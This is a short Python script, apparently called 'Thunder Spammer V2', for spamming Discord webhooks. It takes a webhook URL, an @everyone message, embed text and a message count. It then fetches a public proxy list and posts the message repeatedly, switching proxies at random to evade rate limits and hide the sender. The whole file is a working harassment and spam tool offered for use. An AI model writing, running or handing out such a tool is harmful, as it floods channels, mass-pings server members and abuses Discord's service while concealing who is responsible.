import requests
import json
import sys
import random
import time
import os
import colorama
from colorama import Fore, Style

os.system("cls")

logo = """
▄▄▄▄▄ ▄ .▄▄• ▄▌ ▐ ▄ ·▄▄▄▄  ▄▄▄ .▄▄▄      .▄▄ ·  ▄▄▄· ▄▄▄· • ▌ ▄ ·. • ▌ ▄ ·. ▄▄▄ .▄▄▄  
•██  ██▪▐██▪██▌•█▌▐███▪ ██ ▀▄.▀·▀▄ █·    ▐█ ▀. ▐█ ▄█▐█ ▀█ ·██ ▐███▪·██ ▐███▪▀▄.▀·▀▄ █·
 ▐█.▪██▀▐██▌▐█▌▐█▐▐▌▐█· ▐█▌▐▀▀▪▄▐▀▀▄     ▄▀▀▀█▄ ██▀·▄█▀▀█ ▐█ ▌▐▌▐█·▐█ ▌▐▌▐█·▐▀▀▪▄▐▀▀▄ 
 ▐█▌·██▌▐▀▐█▄█▌██▐█▌██. ██ ▐█▄▄▌▐█•█▌    ▐█▄▪▐█▐█▪·•▐█ ▪▐▌██ ██▌▐█▌██ ██▌▐█▌▐█▄▄▌▐█•█▌
 ▀▀▀ ▀▀▀ · ▀▀▀ ▀▀ █▪▀▀▀▀▀•  ▀▀▀ .▀  ▀     ▀▀▀▀ .▀    ▀  ▀ ▀▀  █▪▀▀▀▀▀  █▪▀▀▀ ▀▀▀ .▀  ▀
                            V2    GITHUB PAGE: github.com/ThunderboltDev

"""
print("\033[34m" + logo)
print("")
print("")
webhook_url = input('Enter the Discord webhook URL: ')

message = "@everyone " + input('Enter your message: ')
print(f"Message has been set as {message}")

embed_title = input('Enter the embed title: ')
print(f"Embed title set to {embed_title}")

embed_description = input('Enter the embed description: ')
print(f"Embed description set to {embed_description}")

embed_image_url = input('Enter the URL of the image or GIF (optional): ')
print(f"Embeded image url set to {embed_image_url}")

num_messages = int(input('Enter the number of messages you want to send: '))
print(f"Messages how much as been set to {num_messages}")

response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
if response.status_code == 200:
    proxies = response.text.split('\r\n')
else:
    print(f'Error fetching proxies: {response.status_code} {response.text}')
    sys.exit()

for i in range(num_messages):
    proxy = {'http': 'http://' + proxies[random.randint(0, len(proxies)-1)]}

    payload = {
        'content': message,
        'embeds': [
            {
                'title': embed_title,
                'description': embed_description,
                'image': {
                    'url': embed_image_url
                }
            }
        ]
    }

    json_payload = json.dumps(payload)

    response = requests.post(webhook_url, data=json_payload, headers={'Content-Type': 'application/json'}, proxies=proxy)

    if response.status_code == 204:
        print(f'Message {i+1} sent successfully.')
    else:
        print(f'Error sending message or skid deleted the webhook or we deleted the webhook but heres the error anyways LMAO {i+1}: {response.content}')

